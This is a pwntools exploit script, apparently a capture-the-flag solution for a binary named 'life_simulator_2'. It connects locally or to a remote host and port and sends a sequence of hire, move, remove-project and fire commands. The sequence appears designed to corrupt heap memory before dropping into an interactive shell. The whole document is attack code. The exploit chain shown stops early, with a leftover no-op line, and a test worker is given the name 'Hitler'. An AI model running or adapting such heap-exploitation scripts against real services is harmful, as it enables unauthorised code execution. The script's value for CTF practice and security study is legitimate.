#!/usr/bin/env python
from pwn import *  # type: ignore
from time import sleep

context.binary = e = ELF("life_simulator_2")
libc = e.libc
gs = """
"""


def start():
    if args.LOCAL:  # type: ignore
        p = e.process()
        if args.GDB:
            gdb.attach(p, gdbscript=gs)
            pause()
    elif args.REMOTE:  # python x.py REMOTE <host> <port>
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p


def add_company(name: bytes, company_budget: int):
    p.sendline(b"add_company "+name+b" "+str(company_budget).encode())


def sell_company(name: bytes):
    p.sendline(b"sell_company "+name)


def add_project(company_name, project_name, project_profit_per_week):
    p.sendline(b"add_project "+company_name+b" "+project_name + b" " +
               str(project_profit_per_week).encode())


def remove_project(company_name, project_name):
    p.sendline(b"remove_project "+company_name+b" "+project_name)


def hire_worker(company_name, project_name, worker_name, salary):
    p.sendline(b"hire_worker "+company_name+b" "+project_name +
               b" "+worker_name+b" "+str(salary).encode())


def fire_worker(worker_name):
    p.sendline(b"fire_worker "+worker_name)


def move_worker(worker_name, new_project_name):
    p.sendline(b"move_worker "+worker_name+b" "+new_project_name)


def worker_info(woker_name):
    p.sendline(b"worker_info "+woker_name)


p = start()

add_company(b"volkswagen", 2000)
p.recvuntil(b"INFO: Success\n")
add_project(b"volkswagen", b"anpha", 600)
p.recvuntil(b"INFO: Success\n")
hire_worker(b"volkswagen", b"anpha", b"Hitler", 100)
add_project(b"volkswagen", b"beta", 600)
p.recvuntil(b"INFO: Success\n")
move_worker(b"Hitler", b"beta")

for i in range(20):
    hire_worker(b"volkswagen", b"anpha", str(i).encode()*0x10, 100)
    p.recvuntil(b"INFO: Success\n")

remove_project(b"volkswagen", b"anpha")
fire_worker(b"Hitler")

p32(0)

p.interactive()
